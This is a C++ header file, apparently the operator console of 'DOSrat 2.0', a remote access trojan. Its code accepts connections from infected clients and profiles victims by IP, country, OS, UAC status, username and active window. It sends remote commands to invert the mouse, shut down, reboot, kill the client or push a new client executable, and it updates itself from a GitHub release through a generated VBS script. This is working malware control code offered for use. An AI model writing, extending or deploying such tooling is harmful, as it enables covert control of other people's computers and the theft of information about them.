#pragma once

void StampaTitolo(short Returns = 0)
{
    TextColor tc;
    tc.SetColor(tc.Green);

    cout << "  ______  _______ ______                      ______    _____  " << endl;
    cout << " (______)(_______) _____)              _     (_____ \\  (_____) " << endl;
    cout << "  _     _ _     ( (____   ____ _____ _| |_     ____) ) _  __ _ " << endl;
    cout << " | |   | | |   | \\____ \\ / ___|____ (_   _)   / ____/ | |/ /| |" << endl;
    cout << " | |__/ /| |___| |____) ) |   / ___ | | |_   | (_____ |   /_| |" << endl;
    cout << " |_____/  \\_____(______/|_|   \\_____|  \\__)  |_______|_)_____/ " << endl << endl;
    cout << "| Versione [" << Version << "]" << endl;
    cout << "| DOSrat 2.0 by Criper98" << endl;

    for (int i = 0; i < Returns; i++)
        cout << endl;

    tc.SetColor(tc.Default);
}

void StampaPrefix(string NomeClient = "")
{
    TextColor tc;

    tc.SetColor(tc.Yellow);

    cout << "DOSrat 2.0";

    if (NomeClient != "")
    {
        tc.SetColor(tc.Default);
        cout << " [";
        tc.SetColor(tc.Purple);
        cout << NomeClient;
        tc.SetColor(tc.Default);
        cout << "]";
    }

    tc.SetColor(tc.Default);
    cout << "> ";
}

bool AutoAggiornamento()
{
    GitHub gh;
    DirUtils du;
    SystemUtils su;

    du.SetCurrDir(du.GetModuleFilePath());

    if (!du.CheckDir("Update"))
        du.MakeDir("Update");

    if (!gh.DownloadFromRepoRelease("criper98", "dosrat-2.0", "DOSrat2.0.zip", "Update\\"))
        return false;

    su.NoOutputCMD("PowerShell Expand-Archive Update\\DOSrat2.0.zip 'Update' -force");

    du.DelFile("Update\\DOSrat2.0.zip");

    if(!du.WriteFile("Update.vbs", "WScript.Sleep 2500\nSet filesys = CreateObject(\"Scripting.FileSystemObject\")\nSet WshShell = WScript.CreateObject(\"WScript.Shell\")\nfilesys.DeleteFile \"DOSrat 2.0.exe\"\nfilesys.DeleteFile \"Build\\Client.exe\"\nfilesys.MoveFile \"Update\\DOSrat 2.0.exe\", \"DOSrat 2.0.exe\"\nfilesys.MoveFile \"Update\\Build\\Client.exe\", \"Build\\Client.exe\"\nWshShell.Run \"DOSrat 2.0.exe\", 1, false\nfilesys.DeleteFile \"Update.vbs\""))
        return false;

    su.NoOutputCMD("start \"\" \"" + du.GetModuleFilePath() + "Update.vbs\"");

    return true;
}

void VerificaAggiornamenti(bool AutoUpdate)
{
    GitHub gh;
    EasyMSGB msgb;
    SystemUtils su;

    string CurrTag = gh.GetRepoTag("criper98", "dosrat-2.0");

    if (CurrTag != Version && CurrTag.find("-1 errore") == string::npos)
    {
        if (AutoUpdate)
        {
            if (AutoAggiornamento())
                exit(0);
        }
        else
        {
            if (msgb.YesNo("Aggiornamento trovato!\nVuoi andare alla pagina ora?", msgb.Info, "DOSrat 2.0"))
                su.OpenURL("https://github.com/Criper98/DOSrat-2.0/releases/latest");
        }
    }
}

void AccettaConnessioni(TcpIP& Server)
{
    int c = 0;
    
    while (true)
    {
        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (!Clients[i].IsConnected)
            {
                c = i;
                i = MAX_CLIENTS;
            }
        }

        if (Server.WaitConn(Clients[c].sock))
            COMUNICAZIONI::Inizializzazione(c, Clients[c].sock);
    }
}

void VerificaConnessioni()
{
    while (true)
    {
        for (int i = 0; i < MAX_CLIENTS; i++)
        {
            if (Clients[i].IsConnected && !Clients[i].InTask)
            {
                char garbage;
                TcpIP::SetTimeout(100, Clients[i].sock);
                if (recv(Clients[i].sock, &garbage, 1, MSG_PEEK) == SOCKET_ERROR)
                {
                    if (WSAGetLastError() == 10054)
                    {
                        closesocket(Clients[i].sock);
                        Clients[i].IsConnected = false;
                        Clu->AggiornaTitolo();
                    }
                }
                TcpIP::SetTimeout(0, Clients[i].sock);
            }
        }
    }
}

bool CheckConnection(SOCKET Sock, int ID)
{
    TextColor tc;

    if (TcpIP::SendString(Sock, "checkconn"))
    {
        tc.SetColor(tc.Yellow);
        cout << "Errore di connessione temporaneo, riprova." << endl;
        tc.SetColor(tc.Default);

        return true;
    }

    tc.SetColor(tc.Red);
    cout << "Impossibile raggiungere il Client." << endl;
    tc.SetColor(tc.Default);

    closesocket(Sock);
    Clients[ID].IsConnected = false;
    Clu->AggiornaTitolo();

    Sleep(2000);
    return false;
}

bool GetInfo(SOCKET Sock, int ID)
{
    json j;
    CLInterface cli;
    VectString Header;
    VectString Body;

    Header.push_back("INFO");
    Header.push_back("VALORE");

    j = COMUNICAZIONI::GetInfo(Sock);

    if (j.dump() == "null")
        return false;

    Body.push_back("IP Wan");
    Body.push_back(Clients[ID].info.IP);

    Body.push_back("IP Lan");
    Body.push_back(j["IPL"]);

    Body.push_back("Nazione");
    Body.push_back(Clients[ID].info.Location.Country);

    Body.push_back("OS");
    Body.push_back(Clients[ID].info.OS);

    Body.push_back("UAC");
    Body.push_back(Clients[ID].info.UAC);

    Body.push_back("Percorso");
    Body.push_back(Clients[ID].info.InstallPath);

    Body.push_back("Versione");
    Body.push_back(Clients[ID].info.Versione);

    Body.push_back("Nome PC");
    Body.push_back(Clients[ID].info.PCname);

    Body.push_back("Nome Utente");
    Body.push_back(Clients[ID].info.UserName);

    Body.push_back("CPU %");
    Body.push_back(j["CPU"]);

    Body.push_back("RAM %");
    Body.push_back(j["RAM"]);

    Body.push_back("Finestra Attiva");
    Body.push_back(j["ACTWIN"]);

    Body.push_back("Data Installazione");
    Body.push_back(j["INSTDATE"]);

    cout << "Informazioni ricevute:" << endl;
    cli.Table(Header, Body);

    return true;
}

bool InvertMouse(SOCKET Sock, int ID)
{
    string Status;

    Status = COMUNICAZIONI::InvertMouse(Sock);

    if (Status == "a")
        cout << "Tasti invertiti." << endl;
    else if (Status == "b")
        cout << "Tasti normali." << endl;
    else
        return false;

    return true;
}

bool Reconnect(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Reconnect(Sock))
    {
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool KillClient(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::KillClient(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool Shutdown(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Shutdown(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

bool Reboot(SOCKET Sock, int ID)
{
    if (COMUNICAZIONI::Reboot(Sock))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return true;
    }

    return false;
}

short UpdateClient(SOCKET Sock, int ID)
{
    DirUtils du;

    string FilePath = du.ChoseFileDialog("Client\0*.exe\0", du.GetModuleFilePath().c_str());

    if (FilePath == "")
        return 1;

    if (COMUNICAZIONI::UpdateClient(Sock, du.GetBinaryFileContent(FilePath)))
    {
        Sleep(1000);
        closesocket(Sock);
        Clients[ID].IsConnected = false;
        Clu->AggiornaTitolo();
        return 0;
    }

    return -1;
}

void Sessione(int ID, SOCKET Sock)
{
    CLInterface cli;
    TextColor tc;

    string cmd;

    system("cls");
    StampaTitolo(1);
    cli.SubTitle("Sessione Comandi", 60, tc.Green);

    for (bool Controllo = true; Controllo;)
    {
        StampaPrefix(Clients[ID].info.UserName);
        getline(cin, cmd);
        cmd = ToLowerCase(cmd);

        Clients[ID].InTask = true;

        if (cmd == "getinfo")
        {
            if (!GetInfo(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
        }
        else if (cmd == "invertmouse")
        {
            if (!InvertMouse(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
        }
        else if (cmd == "exit" || cmd == "close")
            Controllo = false;
        else if (cmd == "reconnect")
        {
            if (!Reconnect(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "clear" || cmd == "cls")
        {
            system("cls");
            StampaTitolo(1);
            cli.SubTitle("Sessione Comandi", 60, tc.Green);
        }
        else if (cmd == "killclient" || cmd == "kill")
        {
            if (!KillClient(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "shutdown")
        {
            if (!Shutdown(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "reboot")
        {
            if (!Reboot(Sock, ID))
                Controllo = CheckConnection(Sock, ID);
            else
                Controllo = false;
        }
        else if (cmd == "updateclient")
        {
            switch (UpdateClient(Sock, ID))
            {
                case -1: Controllo = CheckConnection(Sock, ID); break;
                case 0: Controllo = false; break;
                case 1: break;
            }
        }
        else
        {
            cout << "\"" << cmd << "\" non e' un comando valido, usa \"help\" per la lista di tutti i comandi." << endl;
        }

        Clients[ID].InTask = false;
    }
}